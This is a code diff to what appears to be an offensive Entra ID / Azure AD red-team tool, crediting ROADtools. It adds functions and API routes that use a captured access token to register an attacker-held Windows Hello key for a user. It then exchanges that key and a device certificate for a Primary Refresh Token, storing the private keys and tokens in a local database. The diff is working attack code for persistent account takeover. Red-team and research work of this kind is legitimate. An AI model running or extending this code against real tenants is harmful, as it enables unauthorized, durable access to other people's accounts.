@@ -27,6 +27,7 @@ def init_db():
     con.execute('CREATE TABLE mfa_otp (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at TEXT, secret_key TEXT, account_name INTEGER, description TEXT)')
     con.execute('CREATE TABLE device_certificates (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at INTEGER, device_id TEXT, device_name TEXT, device_type TEXT, join_type TEXT, priv_key TEXT, certificate TEXT)')
     con.execute('CREATE TABLE primary_refresh_tokens (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, user TEXT, prt TEXT, session_key TEXT, issued_at INTEGER, expires_at INTEGER)') # To check if this is complete?
+    con.execute('CREATE TABLE winhello_keys (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at INTEGER, key_id TEXT, device_id TEXT, user TEXT, priv_key TEXT)')
     con.execute('CREATE TABLE settings (setting TEXT UNIQUE, value TEXT)')
     # Valid Settings: active_access_token_id, active_refresh_token_id, schema_version, user_agent
     cur = con.cursor()
@@ -103,6 +104,7 @@ def update_db():
         print("[*] Current database is schema version 4, updating to schema version 5")
         execute_db('CREATE TABLE device_certificates (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at INTEGER, device_id TEXT, device_name TEXT, device_type TEXT, join_type TEXT, priv_key TEXT, certificate TEXT)')
         execute_db('CREATE TABLE primary_refresh_tokens (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, user TEXT, prt TEXT, session_key TEXT, issued_at INTEGER, expires_at INTEGER)')
+        execute_db('CREATE TABLE winhello_keys (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at INTEGER, key_id TEXT, device_id TEXT, user TEXT, priv_key TEXT)')
         execute_db("ALTER TABLE refreshtokens ADD COLUMN client_id TEXT")
         execute_db("UPDATE settings SET value = '5' WHERE setting = 'schema_version'")
         print("[*] Updated database to schema version 5")
@@ -472,30 +474,23 @@ def get_device_code_reprocess_url(user_code):
 
 # ========== PRT Functions ==========
 
-def register_device(access_token_id, device_name, join_type = 0, device_type = "Windows", os_version = "10.0.26100", target_domain = "e-corp.local"):
-    """
-    All credit to:
-    https://github.com/dirkjanm/ROADtools
-    https://github.com/kiwids0220/deviceCode2WinHello
-    """	
-    import struct
+def generate_key_pair():
     from cryptography.hazmat.primitives.asymmetric import rsa
-    from cryptography.hazmat.primitives import serialization, hashes
-    from cryptography import x509
-    from cryptography.x509.oid import NameOID
-    # Generate a private key
-    key = rsa.generate_private_key(
+    from cryptography.hazmat.primitives import serialization
+    private_key = rsa.generate_private_key(
             public_exponent=65537,
             key_size=2048,
         )
-    private_key = key.private_bytes(
+    private_key_bytes = private_key.private_bytes(
         encoding=serialization.Encoding.PEM,
         format=serialization.PrivateFormat.TraditionalOpenSSL,
         encryption_algorithm=serialization.NoEncryption()
     )
-    private_key_base64 = base64.b64encode(private_key).decode('utf-8')
-    # Generate public key RSA blob
-    public_key = key.public_key()
+    public_key = private_key.public_key()
+    return private_key, private_key_bytes, public_key
+
+def generate_public_key_rsa_blob(public_key):
+    import struct
     pubnumbers = public_key.public_numbers()
     exponent_as_bytes = pubnumbers.e.to_bytes((pubnumbers.e.bit_length() + 7) // 8, byteorder='big')
     modulus_as_bytes = pubnumbers.n.to_bytes((pubnumbers.n.bit_length() + 7) // 8, byteorder='big')
@@ -509,10 +504,25 @@ def register_device(access_token_id, device_name, join_type = 0, device_type = "
         struct.pack('<L', 0),
     ]
     pubkeycngblob = base64.b64encode(b''.join(header)+exponent_as_bytes+modulus_as_bytes)
+    return pubkeycngblob
+
+def register_device(access_token_id, device_name, join_type = 0, device_type = "Windows", os_version = "10.0.26100", target_domain = "e-corp.local"):
+    """
+    All credit to:
+    https://github.com/dirkjanm/ROADtools
+    https://github.com/kiwids0220/deviceCode2WinHello
+    """	
+    from cryptography.hazmat.primitives import serialization, hashes
+    from cryptography import x509
+    from cryptography.x509.oid import NameOID
+    # Generate a private key
+    private_key, private_key_bytes, public_key = generate_key_pair()
+    private_key_base64 = base64.b64encode(private_key_bytes).decode('utf-8')
+    pubkeycngblob = generate_public_key_rsa_blob(public_key)
     # Generate Certificate Signing Request
     csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([
             x509.NameAttribute(NameOID.COMMON_NAME, "7E980AD9-B86D-4306-9425-9AC066FB014A"),
-        ])).sign(key, hashes.SHA256())
+        ])).sign(private_key, hashes.SHA256())
     certreq = csr.public_bytes(serialization.Encoding.DER)
     certbytes = base64.b64encode(certreq)
 
@@ -576,15 +586,22 @@ def get_srv_challenge_nonce():
         raise AppError(f"Failed to obtain nonce. No 'Nonce' in response.")
     return nonce_response_json["Nonce"]
 
+def decrypt_session_key(session_key_jwe, private_key):
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.asymmetric import padding as apadding
+    jwe_payload_base64 = session_key_jwe.split(".")[1]
+    jwe_payload_base64_padded = jwe_payload_base64 + ('='*(len(jwe_payload_base64)%4))
+    jwe_payload_bytes = base64.urlsafe_b64decode(jwe_payload_base64_padded)
+    session_key_bytes = private_key.decrypt(jwe_payload_bytes, apadding.OAEP(apadding.MGF1(hashes.SHA1()), hashes.SHA1(), None))
+    session_key_hex = binascii.hexlify(session_key_bytes).decode('utf-8')
+    return session_key_hex
+
 def request_prt_for_device(device_id, refresh_token_id, os_version = "10.0.26100"):
     """
     All credit to:
     https://github.com/dirkjanm/ROADtools
     https://github.com/kiwids0220/deviceCode2WinHello
     """	
-    import binascii
-    from cryptography.hazmat.primitives import hashes
-    from cryptography.hazmat.primitives.asymmetric import padding as apadding
     from cryptography.hazmat.primitives import serialization
     nonce = get_srv_challenge_nonce()
     refresh_token = query_db("SELECT refreshtoken FROM refreshtokens WHERE id = ?",[refresh_token_id],one=True)[0]
@@ -629,13 +646,7 @@ def request_prt_for_device(device_id, refresh_token_id, os_version = "10.0.26100
     if not "refresh_token" in response_json or not "session_key_jwe" in response_json:
         raise AppError(f"Failed to request PRT. No 'refresh_token' or 'session_key_jwe' in response.")
     prt = response_json["refresh_token"]
-    # Decrypt session key
-    session_key_jwe = response_json["session_key_jwe"]
-    jwe_payload_base64 = session_key_jwe.split(".")[1]
-    jwe_payload_base64_padded = jwe_payload_base64 + ('='*(len(jwe_payload_base64)%4))
-    jwe_payload_bytes = base64.urlsafe_b64decode(jwe_payload_base64_padded)
-    session_key_bytes =private_key.decrypt(jwe_payload_bytes, apadding.OAEP(apadding.MGF1(hashes.SHA1()), hashes.SHA1(), None))
-    session_key_hex = binascii.hexlify(session_key_bytes).decode('utf-8')
+    session_key_hex = decrypt_session_key(response_json["session_key_jwe"], private_key)
     # Store PRT
     issued_at = int(datetime.now().timestamp())
     expires_at = response_json["expires_on"]
@@ -766,6 +777,10 @@ def refresh_prt_to_access_token(prt_id, client_id = "d3590ed6-52b3-4102-aeff-aad
     return access_token_row_id
 
 def generate_prt_cookie(prt_id):
+    """
+    All credit to:
+    https://github.com/dirkjanm/ROADtools
+    """
     from cryptography.hazmat.primitives import hashes
     prt_row = query_db_json("SELECT * FROM primary_refresh_tokens WHERE id = ?",[prt_id],one=True)
     if not prt_row:
@@ -793,6 +808,125 @@ def generate_prt_cookie(prt_id):
     derived_key = calculate_derived_key(session_key,kdfcontext)
     prt_cookie = jwt.encode(jwt_payload, derived_key, algorithm='HS256', headers=jwt_headers)
     return prt_cookie
+
+def register_winhello(access_token_id):
+    """
+    All credit to:
+    https://github.com/dirkjanm/ROADtools
+    """
+    rows = query_db("SELECT accesstoken FROM accesstokens WHERE id = ?",[access_token_id],one=True)
+    if not rows:
+        raise AppError(f"No access token with ID {access_token_id}!")
+    access_token = rows[0]
+    decoded_accesstoken = jwt.decode(access_token, options={"verify_signature": False})
+    if not "deviceid" in decoded_accesstoken:
+        gspy_log.error(f"No device ID found in access token with ID {access_token_id}! This will probably fail!")
+    device_id = decoded_accesstoken.get("deviceid", "00000000-0000-0000-0000-000000000000")
+    headers = {
+        'Authorization': f'Bearer {access_token}',
+        'User-Agent': 'Dsreg/10.0 (Windows 10.0.19044.1826)',
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+    }
+    private_key, private_key_bytes, public_key = generate_key_pair()
+    private_key_base64 = base64.b64encode(private_key_bytes).decode('utf-8')
+    pubkeycngblob = generate_public_key_rsa_blob(public_key)
+    data = {
+        "kngc": pubkeycngblob.decode('utf-8')
+    }
+    response = requests.post("https://enterpriseregistration.windows.net/EnrollmentServer/key/?api-version=1.0", headers=headers, json=data)
+    if response.status_code != 200:
+        raise AppError(f"Failed to register WinHello for device. Received status code {response.status_code}")
+    response_json = response.json()
+    key_id = response_json.get("kid", "00000000-0000-0000-0000-000000000000")
+    user = response_json.get("upn", "Unknown")
+    winhello_id = execute_db("INSERT INTO winhello_keys (stored_at, key_id, device_id, user, priv_key) VALUES (?, ?, ?, ?, ?)", (
+        int(time.time()),
+        key_id,
+        device_id,
+        user,
+        private_key_base64
+    ))
+    return winhello_id
+    
+def winhello_to_prt(winhello_id, device_id = None):
+    """
+    All credit to:
+    https://github.com/dirkjanm/ROADtools
+    """
+    from cryptography.hazmat.primitives import serialization, hashes
+    winhello = query_db("SELECT * FROM winhello_keys WHERE id = ?",[winhello_id],one=True)
+    if not winhello:
+        raise AppError(f"No WinHello key with ID {winhello_id}!")
+    winhello_private_key_base64 = winhello["priv_key"]
+    winhello_private_key_bytes = base64.b64decode(winhello_private_key_base64)
+    winhello_private_key = serialization.load_pem_private_key(winhello_private_key_bytes, password=None)
+    winhello_public_key = winhello_private_key.public_key()
+    pubkeycngblob = base64.b64decode(generate_public_key_rsa_blob(winhello_public_key))
+    digest = hashes.Hash(hashes.SHA256())
+    digest.update(pubkeycngblob)
+    kid = base64.b64encode(digest.finalize()).decode('utf-8')
+    if not device_id:
+        device_id = winhello["device_id"]
+    winhello_username = winhello["user"]
+    
+    winhello_assertion_payload = {
+          "iss": winhello_username,
+          "aud": "common",
+          "iat": int(time.time())-3600,
+          "exp": int(time.time())+3600,
+          "request_nonce": get_srv_challenge_nonce(),
+          "scope": "openid aza ugs"
+        }
+    winhello_assertion_headers = {
+            "kid": kid,
+            "use": "ngc"
+        }
+    winhello_assertion = jwt.encode(winhello_assertion_payload, winhello_private_key_bytes, algorithm='RS256', headers=winhello_assertion_headers)
+
+    jwt_payload = {
+            "client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",
+            "request_nonce": get_srv_challenge_nonce(),
+            "scope": "openid aza ugs",
+            "group_sids": [],
+            "win_ver": "10.0.19041.868",
+            "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
+            "username": winhello_username,
+            "assertion": winhello_assertion
+        }
+
+    device_certificate_base64 = query_db("SELECT certificate FROM device_certificates WHERE device_id = ?",[device_id],one=True)[0]
+    device_private_key_base64 = query_db("SELECT priv_key FROM device_certificates WHERE device_id = ?",[device_id],one=True)[0]
+    if not device_certificate_base64 or not device_private_key_base64:
+        raise AppError(f"No certificate or private key for device with ID {device_id}!")
+    jwt_header = {
+        "x5c": device_certificate_base64,
+        "kdf_ver": 2
+    }
+    device_private_key_bytes = base64.b64decode(device_private_key_base64)
+    device_private_key = serialization.load_pem_private_key(device_private_key_bytes, password=None)
+    jwt_token = jwt.encode(jwt_payload, device_private_key, algorithm='RS256', headers=jwt_header)
+    prt_request_body = {
+        'windows_api_version':'2.2',
+        'grant_type':'urn:ietf:params:oauth:grant-type:jwt-bearer',
+        'request':jwt_token,
+        'client_info':'1'
+    }
+    headers = {"User-Agent":get_user_agent()}
+    response = requests.post("https://login.microsoftonline.com/common/oauth2/token", data=prt_request_body, headers=headers)
+    if response.status_code != 200:
+        raise AppError(parse_token_endpoint_error(response))
+    response_json = response.json()
+    gspy_log.debug(f"PRT request response:\n{response_json}")
+    if not "refresh_token" in response_json or not "session_key_jwe" in response_json:
+        raise AppError(f"Failed to request PRT. No 'refresh_token' or 'session_key_jwe' in response.")
+    prt = response_json["refresh_token"]
+    session_key_hex = decrypt_session_key(response_json["session_key_jwe"], device_private_key)
+    # Store PRT
+    issued_at = int(datetime.now().timestamp())
+    expires_at = response_json["expires_on"]
+    prt_id = execute_db("INSERT INTO primary_refresh_tokens (device_id, user, prt, session_key, issued_at, expires_at) VALUES (?, ?, ?, ?, ?, ?)", (device_id, winhello_username, prt, session_key_hex, issued_at, expires_at))
+    return prt_id
         
 # ========== MFA Functions ==========
 
@@ -1567,6 +1701,30 @@ def init_routes():
         prt_id = request.form['prt_id']
         prt_cookie = generate_prt_cookie(prt_id)
         return create_response(200, f"Successfully generated PRT cookie using PRT {prt_id}.", {"prt_cookie": prt_cookie})
+    
+    @app.post("/api/register_winhello")
+    def api_register_winhello():
+        if not "access_token_id" in request.form:
+            return f"[Error] No access_token_id specified.", 400
+        access_token_id = request.form['access_token_id']
+        winhello_id = register_winhello(access_token_id)
+        return create_response(200, f"Successfully registered WinHello for device with ID {winhello_id}.", {"winhello_id": winhello_id})
+    
+    @app.route("/api/list_winhello_keys")
+    def api_list_winhello_keys():
+        rows = query_db_json("SELECT * FROM winhello_keys")
+        return create_response(200, data=rows)
+
+    @app.post("/api/winhello_to_prt")
+    def api_winhello_to_prt():
+        if not "winhello_id" in request.form:
+            return f"[Error] No winhello_id specified.", 400
+        winhello_id = request.form['winhello_id']
+        device_id = request.form.get('device_id') 
+        if not device_id and "device_db_id" in request.form:
+            device_id = query_db("SELECT device_id FROM device_certificates WHERE id = ?",[request.form['device_db_id']],one=True) or None
+        prt_id = winhello_to_prt(winhello_id, device_id)
+        return create_response(200, f"Successfully used WinHello key to obtain PRT with ID {prt_id}.", {"prt_id": prt_id})
 
         # ========== MFA ==========
 
